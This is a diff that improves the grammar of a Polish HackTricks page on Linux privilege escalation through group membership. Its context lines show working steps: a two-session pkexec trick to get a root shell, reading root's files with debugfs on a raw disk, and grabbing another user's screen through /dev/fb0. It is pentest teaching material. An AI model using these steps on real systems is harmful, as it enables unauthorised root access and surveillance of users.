@@ -41,7 +41,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś połączony bez GUI**. I jest obejście tego problemu tutaj: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji ssh**:
+**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś połączony bez GUI**. A tutaj jest obejście tego problemu: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji ssh**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -74,9 +74,9 @@ Więc przeczytaj plik i spróbuj **złamać niektóre hashe**.
 
 # Grupa dysków
 
-To uprawnienie jest prawie **równoważne z dostępem root** ponieważ możesz uzyskać dostęp do wszystkich danych wewnątrz maszyny.
+To uprawnienie jest prawie **równoważne dostępowi root**, ponieważ możesz uzyskać dostęp do wszystkich danych wewnątrz maszyny.
 
-Pliki: `/dev/sd[a-z][1-9]`
+Pliki:`/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -89,7 +89,7 @@ Zauważ, że używając debugfs możesz również **zapisywać pliki**. Na przyk
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Jednak jeśli spróbujesz **zapisać pliki należące do roota** \(jak `/etc/shadow` lub `/etc/passwd`\) otrzymasz błąd "**Permission denied**".
+Jednak jeśli spróbujesz **zapisać pliki należące do roota** \(jak `/etc/shadow` lub `/etc/passwd`\), otrzymasz błąd "**Permission denied**".
 
 # Grupa wideo
 
@@ -101,7 +101,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1** oznacza, że użytkownik **yossi jest fizycznie zalogowany** do terminala na maszynie.
 
-Grupa **video** ma dostęp do wyświetlania danych wyjściowych ekranu. W zasadzie możesz obserwować ekrany. Aby to zrobić, musisz **złapać bieżący obraz na ekranie** w surowych danych i uzyskać rozdzielczość, którą używa ekran. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`
+Grupa **video** ma dostęp do wyświetlania wyjścia ekranu. W zasadzie możesz obserwować ekrany. Aby to zrobić, musisz **złapać bieżący obraz na ekranie** w surowych danych i uzyskać rozdzielczość, którą używa ekran. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -133,6 +133,5 @@ Możesz zamontować system plików root maszyny hosta do woluminu instancji, wi�
 # Grupa lxc/lxd
 
 [lxc - Podwyższenie uprawnień](lxd-privilege-escalation.md)
-
 
 {{#include ../../banners/hacktricks-training.md}}
